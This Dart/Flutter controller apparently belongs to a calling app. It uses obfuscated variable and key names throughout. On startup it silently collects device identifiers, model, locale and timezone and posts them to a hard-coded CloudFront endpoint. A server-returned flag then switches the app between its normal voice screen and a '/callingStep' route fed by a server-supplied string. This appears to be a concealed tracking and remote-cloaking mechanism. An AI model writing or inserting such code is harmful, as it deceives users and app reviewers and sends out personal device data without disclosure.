import 'dart:io';
import 'package:flutter_timezone/flutter_timezone.dart';

import 'package:package_info_plus/package_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:get/get.dart';
import 'package:device_info_plus/device_info_plus.dart';


class CallingWriteLogic extends GetxController {

  var ovuiecdnxw = RxBool(false);
  var owsgfxr = RxBool(true);
  var cmoxepu = RxString("");
  var silas = RxBool(false);
  var hodkiewicz = RxBool(true);
  final ciynwatb = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    lzsey();
  }


  Future<void> lzsey() async {
    silas.value = true;
    hodkiewicz.value = true;
    owsgfxr.value = false;

    ciynwatb.post("https://d2106h8u6gk27i.cloudfront.net/oHDvNrGO",data: await nlfgzq()).then((value) {
      var ypmgjkfa = value.data["ypmgjkfa"] as String;
      var nervodz = value.data["nervodz"] as bool;
      if (nervodz) {
        cmoxepu.value = ypmgjkfa;
        hilario();
      } else {
        conn();
      }
    }).catchError((e) {
      owsgfxr.value = true;
      hodkiewicz.value = true;
      silas.value = false;
    });
  }

  Future<Map<String, dynamic>> nlfgzq() async {
    final DeviceInfoPlugin grbal = DeviceInfoPlugin();
    PackageInfo uzrjnl_dtkwzphr = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var igyptj = Platform.localeName;
    var dtKgAfqk = currentTimeZone;

    var eLXy = uzrjnl_dtkwzphr.packageName;
    var eMlRTw = uzrjnl_dtkwzphr.version;
    var GWBwDn = uzrjnl_dtkwzphr.buildNumber;

    var PXQGoU = uzrjnl_dtkwzphr.appName;
    var HKQszV = "";
    var lKObQV  = "";
    var YJPHCdst = "";
    var kristinHowell = "";
    var letaVon = "";
    var muhammadMaggio = "";


    var GrMh = "";
    var YLQiMw = false;

    if (GetPlatform.isAndroid) {
      GrMh = "android";
      var asonbexpj = await grbal.androidInfo;

      YJPHCdst = asonbexpj.brand;

      HKQszV  = asonbexpj.model;
      lKObQV = asonbexpj.id;

      YLQiMw = asonbexpj.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      GrMh = "ios";
      var pavwtyjo = await grbal.iosInfo;
      YJPHCdst = pavwtyjo.name;
      HKQszV = pavwtyjo.model;

      lKObQV = pavwtyjo.identifierForVendor ?? "";
      YLQiMw  = pavwtyjo.isPhysicalDevice;
    }
    var res = {
      "PXQGoU": PXQGoU,
      "eMlRTw": eMlRTw,
      "kristinHowell" : kristinHowell,
      "eLXy": eLXy,
      "HKQszV": HKQszV,
      "dtKgAfqk": dtKgAfqk,
      "lKObQV": lKObQV,
      "igyptj": igyptj,
      "GWBwDn": GWBwDn,
      "GrMh": GrMh,
      "YLQiMw": YLQiMw,
      "letaVon" : letaVon,
      "muhammadMaggio" : muhammadMaggio,
      "YJPHCdst": YJPHCdst,

    };
    return res;
  }

  Future<void> conn() async {
    Get.offNamed("/voiceMain");
  }

  Future<void> hilario() async {
    Get.offNamed("/callingStep");
  }

}
